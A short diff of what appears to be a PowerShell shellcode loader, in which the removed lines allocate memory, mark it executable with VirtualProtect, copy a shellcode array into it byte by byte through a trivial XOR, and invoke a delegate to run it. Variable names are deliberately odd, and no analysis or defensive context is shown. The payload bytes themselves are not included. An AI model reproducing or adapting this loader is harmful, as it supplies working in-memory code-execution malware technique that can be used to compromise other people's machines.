@@ -62,23 +62,4 @@ $IDK = $startMain::GetDele($CRROTETREDA)
 $NEWO = New-Object System.Object
 $NEWO | Add-Member NoteProperty -Name fnCRT -Value $IDK
 
-#PIPE2
-#NEDDING 
-$Nothing=0
 
-$Allohocate= $startMain::malloc([UInt32]$SHLEN4)
-
-for ($i=0;$i -le ($shellcode.Length-1);$i++) {
-    $cc=$startMain::VirtualProtect([IntPtr]($Allohocate.toInt64()+$Nothing+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)
-
-    $sh = $shellcode[$i] -bxor 0x0
-    $c = $startMain::memset([IntPtr]($Allohocate.ToInt64()+$Nothing+$i), $sh , 1)
-
-}
-
-$p = 0
-
-#PIPE3
-#Nedding $Allohocate && $NEWO
-
-$o = $NEWO.fnCRT.Invoke(-1, 0, 0, $Allohocate, 0, 0, 0, [ref]$p)
